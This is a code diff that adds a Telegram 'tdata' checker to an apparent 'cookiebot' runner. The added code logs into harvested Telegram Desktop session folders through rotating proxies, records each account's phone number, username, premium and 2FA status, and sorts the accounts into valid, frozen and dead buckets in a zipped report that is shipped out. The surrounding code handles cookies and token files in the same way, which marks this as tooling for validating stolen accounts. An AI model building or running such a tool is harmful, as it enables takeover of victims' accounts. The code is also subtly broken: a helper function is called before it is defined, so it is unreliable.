@@ -20,7 +20,7 @@ _flush = [0.0]
 
 RULE   = "━━━━━━━━━━━━━━━━━━━━━━━━━━"
 THIN   = "┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄"
-STAGE_ICON = {'boot': '🟡', 'idle': '🟢', 'installing': '🧩', 'download': '📥', 'downloaded': '✅', 'extract': '📦', 'extracted': '✅', 'wrong_password': '🔑', 'scan': '🔍', 'authcheck': '🔎', 'packed': '🗃', 'done': '🏁', 'error': '❌', 'cancelled': '🛑', 'cancelling': '🛑', 'queued': '⏳', 'retired': '♻️', 'ttl_expired': '♻️'}
+STAGE_ICON = {'boot': '🟡', 'idle': '🟢', 'installing': '🧩', 'download': '📥', 'downloaded': '✅', 'extract': '📦', 'extracted': '✅', 'wrong_password': '🔑', 'scan': '🔍', 'authcheck': '🔎', 'tdatacheck': '🗂', 'packed': '🗃', 'done': '🏁', 'error': '❌', 'cancelled': '🛑', 'cancelling': '🛑', 'queued': '⏳', 'retired': '♻️', 'ttl_expired': '♻️'}
 VM_TTL = 3600
 class _Ref:
     ref = 'rojaskomar67-ops/cookiebot-vm'
@@ -130,6 +130,15 @@ def stage_panel(p: dict) -> str:
         lines.append(f"⏳ {code(p.get('expired', 0))} expired   "
                      f"❌ {code(p.get('dead', 0))} dead   "
                      f"⚠️ {code(p.get('err', 0))} error   🌍 {code(p.get('proxies', 0))} proxies")
+
+    if stage == "tdatacheck" and p.get("tk_total"):
+        lines.append(f"🗃 {code('%d folders' % p.get('tk_total', 0))}"
+                     f"  {bar((p.get('tk_done') or 0) * 100 // max(p.get('tk_total'), 1))}")
+        lines.append(f"✅ {code(p.get('tk_valid', 0))} valid "
+                     f"(👑 {code(p.get('tk_prem', 0))} premium · 🔒 {code(p.get('tk_2fa', 0))} 2FA)")
+        lines.append(f"🧊 {code(p.get('tk_frozen', 0))} frozen   "
+                     f"💀 {code(p.get('tk_dead', 0))} dead   ⏳ {code(p.get('tk_err', 0))} retrying"
+                     f"   🌍 {code(p.get('tk_proxies', 0))} proxies")
 
     if stage == "error" and p.get("err"):
         lines.append(f"⚠️ {bold('Error')}: {code(p.get('err'))}")
@@ -1285,6 +1294,253 @@ def pack_tdata(dirs):
 
 TOKEN_NAMES = ("tokens.txt", "token.txt")
 
+def check_tdata(tdirs):
+    """Runs on the RUNNER: proxy-check every tdata. Live card, buckets zip.
+    Returns tk_* dict for the payload. Never raises."""
+    from concurrent.futures.thread import ThreadPoolExecutor
+    out = {"tk_total": len(tdirs), "tk_valid": 0, "tk_prem": 0, "tk_2fa": 0,
+           "tk_frozen": 0, "tk_dead": 0, "tk_err": 0, "tk_zip": False}
+    if stop():
+        return out
+    if not tdirs:
+        return out
+    proxies = auth_fetch_proxies()
+    out["tk_proxies"] = len(proxies)
+    if not ensure_pkgs():
+        sys.stdout.write("tdcheck: package install failed — aborting cleanly\n")
+        sys.stdout.flush()
+        out["tk_err"] = len(tdirs)
+        tick("tdatacheck", 96, **out)
+        return out
+    tick("tdatacheck", 90, tk_total=out["tk_total"], tk_done=0,
+         tk_valid=0, tk_prem=0, tk_2fa=0, tk_frozen=0, tk_dead=0, tk_err=0,
+         tk_proxies=len(proxies))
+    sys.stdout.write("tdcheck: %d folders, %d proxies\n"
+                     % (len(tdirs), len(proxies))); sys.stdout.flush()
+
+    # opentele turns a tdata folder into a real telethon client; telethon
+    # needs python-socks to hop through the HTTP proxies. No VPN, no VM apps —
+    # everything is fetched at check time on the runner itself.
+    def ensure_pkgs():
+        for pkg in ("opentele", "python-socks"):
+            try:
+                __import__(pkg)
+                continue
+            except ImportError:
+                pass
+            subprocess.run([sys.executable, "-m", "pip", "install", "--quiet",
+                            pkg], timeout=600,
+                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        try:
+            import opentele  # noqa
+            return True
+        except Exception as e:
+            sys.stdout.write("tdcheck: opentele unavailable: %s\n" % e)
+            sys.stdout.flush()
+            return False
+
+    def parse_proxy(p):
+        m = re.match(r"(\w+)://(?:([^:@]+)(?::([^@]*))?@)?([^:/]+)(?::(\d+))?", p)
+        if not m:
+            return None
+        scheme, user, pw, host, port = m.groups()
+        return (scheme.lower() or "http", user, pw, host, int(port or 80))
+
+    # state per folder
+    res = [dict(orig=str(d), status="err", reason="", phone="-", user="-",
+                prem=False, tfa=False, proxy="-") for d in tdirs]
+    MAX_TRY = 2
+
+    def check_one(i, seed):
+        r = res[i]
+        tdir = r["orig"]
+        proxy = None
+        if proxies and seed < MAX_TRY - 1:
+            proxy = proxies[(seed * 7919 + i) % len(proxies)]
+        r["proxy"] = proxy or "direct"
+        from telethon import errors, functions
+        from opentele.td import TDesktop
+        prox = None
+        if proxy:
+            scheme, user, pw, host, port = parse_proxy(proxy)
+            import socks
+            t = {"http": socks.HTTP, "socks4": socks.SOCKS4,
+                 "socks5": socks.SOCKS5}.get(scheme, socks.SOCKS5)
+            prox = (t, host, port, True, user, pw)
+        try:
+            td = TDesktop(tdir)
+            if not td.isLoaded():
+                raise RuntimeError("tdata folder failed to load/decrypt")
+            c = td.ToTelethon(session=str(WORK / ("tks_%d" % i)), proxy=prox)
+
+            import asyncio
+            async def _m():
+                try:
+                    await c.connect()
+                    if not c.is_user_authorized():
+                        raise errors.UnauthorizedError(
+                            None) if hasattr(errors, "UnauthorizedError") \
+                            else RuntimeError("unauthorized")
+                    me = await c.get_me()
+                    full = await c(functions.users.GetFullUserRequest(me.id))
+                    prem = bool(getattr(full.full_user, "premium", False))
+                    try:
+                        pwq = await c(functions.account.GetPasswordRequest())
+                        tfa = bool(getattr(pwq, "current_algo", None))
+                    except Exception:
+                        tfa = False
+                    phone = getattr(me, "phone_number", "") or "-"
+                    uname = ("@" + me.username) if getattr(me, "username",
+                                                           None) else (me.first_name or "-")
+                    return "valid", "", str(phone), str(uname), prem, tfa
+                finally:
+                    try: await c.disconnect()
+                    except Exception: pass
+            loop = asyncio.new_event_loop()
+            try:
+                ret = loop.run_until_complete(asyncio.wait_for(_m(), 90))
+            finally:
+                loop.close()
+            st_, why, phone, uname, prem, tfa = ret
+            r.update(status=st_, reason=why, phone=phone, user=uname,
+                     prem=prem, tfa=tfa)
+        except Exception as e:
+            n, m = type(e).__name__, str(e)[:90]
+            if "DeactivatedBan" in n or "deactivated, ban" in m.lower() \
+                    or "banned" in m.lower():
+                r.update(status="frozen", reason=m)
+            elif "UserDeactivated" in n or "SessionRevoked" in n \
+                    or "AuthKeyUnregistered" in n or "Unauthorized" in n \
+                    or "revoked" in m.lower() or "unregistered" in m.lower():
+                r.update(status="dead", reason=m)
+            else:
+                r.update(status="err", reason=m)
+        finally:
+            for f in (WORK / ("tks_%d.session" % i),
+                      WORK / ("tks_%d.session-journal" % i)):
+                try: f.unlink(missing_ok=True)
+                except Exception: pass
+
+    def progress():
+        done = [r for r in res if r["status"] in ("valid", "frozen", "dead")]
+        v = [r for r in done if r["status"] == "valid"]
+        tick("tdatacheck", 90, tk_total=out["tk_total"], tk_done=len(done),
+             tk_valid=len(v), tk_prem=sum(1 for r in v if r["prem"]),
+             tk_2fa=sum(1 for r in v if r["tfa"]),
+             tk_frozen=sum(1 for r in done if r["status"] == "frozen"),
+             tk_dead=sum(1 for r in done if r["status"] == "dead"),
+             tk_err=sum(1 for r in res if r["status"] == "err"),
+             tk_proxies=len(proxies))
+
+    for seed in range(MAX_TRY):
+        if stop():
+            return {}
+        pend = [i for i, r in enumerate(res) if r["status"] == "err"]
+        if not pend:
+            break
+        progress()
+        for k in range(0, len(pend), 5):
+            if stop():
+                return {}
+            with ThreadPoolExecutor(
+                    max_workers=min(5, len(pend) - k)) as exr:
+                for _ in exr.map(check_one, pend[k:k + 5], [seed] * (len(pend) - k)):
+                    if stop():
+                        return {}
+            progress()
+
+    # leftovers still error → dead bucket target but reported honestly
+    for r in res:
+        if r["status"] == "err":
+            r["status"] = "dead"
+            r["reason"] = "unreachable after %d attempts: %s" % (MAX_TRY, r["reason"])
+
+    valid = [r for r in res if r["status"] == "valid"]
+    prem  = [r for r in valid if r["prem"]]
+    free  = [r for r in valid if not r["prem"]]
+    twofa = [r for r in valid if r["tfa"]]
+    fro   = [r for r in res if r["status"] == "frozen"]
+    dead  = [r for r in res if r["status"] == "dead"]
+    out.update(tk_valid=len(valid), tk_prem=len(prem), tk_2fa=len(twofa),
+               tk_frozen=len(fro), tk_dead=len(dead), tk_err=0)
+    tick("tdatacheck", 96, tk_total=out["tk_total"], tk_done=len(res),
+         tk_valid=len(valid), tk_prem=len(prem), tk_2fa=len(twofa),
+         tk_frozen=len(fro), tk_dead=len(dead), tk_err=0,
+         tk_proxies=len(proxies))
+
+    def tline(r):
+        return ("Folder: %s\nPhone: %s | User: %s | Premium: %s | 2FA: %s\n"
+                "Status: %s | %s\nProxy: %s\n%s\n"
+                % (r["orig"].replace(str(WORK / "ex") + "/", "")
+                   .replace(str(WORK / "tdex") + "/", "")
+                   .replace(str(WORK / "tdfull") + "/", ""),
+                   r.get("phone", "-"), r.get("user", "-"),
+                   "YES" if r.get("prem") else "no",
+                   "YES" if r.get("tfa") else "no",
+                   r["status"], r.get("reason", ""),
+                   r.get("proxy", "-"), "-" * 48))
+
+    # buckets: VALID(VALID_P/VALID_F) FROZEN DEAD + copies of the checked folders
+    try:
+        (OUT / "tdresults").mkdir(parents=True, exist_ok=True)
+        BASE = WORK / "ex"
+        for fold, rows in (("VALID", valid), ("FROZEN", fro), ("DEAD", dead)):
+            if not rows:
+                continue
+            d = OUT / "tdresults" / fold
+            d.mkdir(parents=True, exist_ok=True)
+            hits = ""
+            for n, r in enumerate(rows, 1):
+                tag = re.sub(r"[^\w.-]", "_",
+                             r["orig"].replace(str(BASE) + "/", ""))[-60:]
+                info = d / ("%s.txt" % tag)
+                info.write_text(tline(r), encoding="utf-8")
+                hits += tline(r)
+            (d / "hits.txt").write_text(hits, encoding="utf-8")
+        with open(OUT / "tdresults/all_results.json", "w", encoding="utf-8") as f:
+            json.dump(res, f, ensure_ascii=False)
+        with open(OUT / "tdresults/proxies_used.txt", "w", encoding="utf-8") as f:
+            f.write("\n".join(proxies) + "\n")
+    except Exception as e:
+        sys.stdout.write("tdcheck buckets: %s\n" % e); sys.stdout.flush()
+
+    report = ("==================================================\n   TDATA CHECKER REPORT\n"
+              "   %s\n" % time.strftime("%Y-%m-%d %H:%M:%S", time.gmtime()) +
+              "==================================================\n\n"
+              "Total tdata folders   : %d\n" % len(res) +
+              "Proxies used          : %d\n\n" % len(proxies) +
+              "VALID sessions        : %d\n" % len(valid) +
+              "  PREMIUM             : %d\n" % len(prem) +
+              "  FREE                : %d\n" % len(free) +
+              "2FA on                : %d\n" % len(twofa) +
+              "FROZEN / deactivated  : %d\n" % len(fro) +
+              "DEAD / revoked        : %d\n\n" % len(dead) +
+              "--- VALID ---\n" + ("".join(tline(r) for r in valid) or "  none\n") +
+              ("--- FROZEN ---\n%s" % "".join(tline(r) for r in fro) if fro else "") +
+              ("--- DEAD ---\n%s" % "".join(tline(r) for r in dead) if dead else ""))
+    zpath = OUT / "tdata_report.zip"
+    with zipfile.ZipFile(zpath, "w", zipfile.ZIP_DEFLATED) as z:
+        z.writestr("report.txt", report)
+        for fp in sorted((OUT / "tdresults").rglob("*")):
+            if fp.is_file():
+                z.write(fp, str(fp.relative_to(OUT / "tdresults")))
+    def tdcap(size, idx, count, tot, split):
+        return (f"{gold_header('TDATA CHECK DONE', esc(str(len(res)) + ' folders'))}"
+                f"\n{THIN}\n"
+                f"✅ {bold('Valid')}     {code(len(valid))}  👑 {bold('Premium')}  "
+                f"{code(len(prem))} · ⛅ {bold('Free')}  {code(len(free))}\n"
+                f"🔒 {bold('2FA on')}   {code(len(twofa))}\n"
+                f"🧊 {bold('Frozen')}    {code(len(fro))}  ·  💀 {bold('Dead')}  "
+                f"{code(len(dead))}\n"
+                f"🌐 {bold('Proxies')}   {code(len(proxies) or 1)} · live feed\n"
+                + ship_note(idx, count, size, tot, split, "tdata_report.zip"))
+    n_parts, link = ship(zpath, tdcap)
+    if link:
+        out["tk_link"] = link
+    out["tk_zip"] = n_parts > 0
+    return out
+
+
 def find_tokens(roots):
     """Every tokens.txt / token.txt in the extracted trees — Telegram Desktop
     clients drop these next to (or beside) the tdata folders."""
@@ -1400,7 +1656,9 @@ def finish(task, stage, **extra):
                     if k in ("err", "found", "cookies", "tried", "sent", "failed",
                              "links", "auth", "auth_sent", "auth_fid", "td_total",
                              "td_parts", "td_via", "tok_total", "tok_parts",
-                             "js_total", "js_parts",
+                             "js_total", "js_parts", "tk_total", "tk_valid",
+                             "tk_prem", "tk_2fa", "tk_frozen", "tk_dead",
+                             "tk_err", "tk_zip", "tk_proxies", "tk_link",
                              "ck_total", "ck_live", "ck_prem", "ck_free",
                              "ck_exp", "ck_dead", "ck_err", "ck_zip", "ck_proxies")})
     payload["pubs"] = PB[3]
@@ -1497,6 +1755,17 @@ def process(task):
             td_via = "chat"
         if td_link:
             links["tdata"] = td_link
+    tk = {}
+    if want_tdata and task.get("tdatacheck") and tdirs:
+        st("queued", 89, job=task.get("job"), vm=SPECS,
+           msg="tdata proxy-check starting")
+        try:
+            tk = check_tdata(tdirs)
+        except Exception as e:
+            sys.stdout.write("tdcheck crashed: %s\n" % e); sys.stdout.flush()
+            tk = {"tk_total": len(tdirs), "tk_valid": 0, "tk_prem": 0,
+                  "tk_2fa": 0, "tk_frozen": 0, "tk_dead": 0, "tk_err": len(tdirs),
+                  "tk_proxies": 0, "tk_zip": False}
     tok_zip, tok_total = None, 0
     toks = find_tokens([WORK / "ex", WORK / "tdex", WORK / "tdfull"])
     if toks:
@@ -1565,7 +1834,7 @@ def process(task):
            auth_sent=auth_sent, auth_fid=auth_fid if want_auth else None,
            td_total=td_total, td_parts=td_parts, td_via=td_via,
            tok_total=tok_total, tok_parts=tok_parts,
-           js_total=js_total, js_parts=js_parts, **ck)
+           js_total=js_total, js_parts=js_parts, **tk, **ck)
 
 def main():
     OUT.mkdir(parents=True, exist_ok=True)
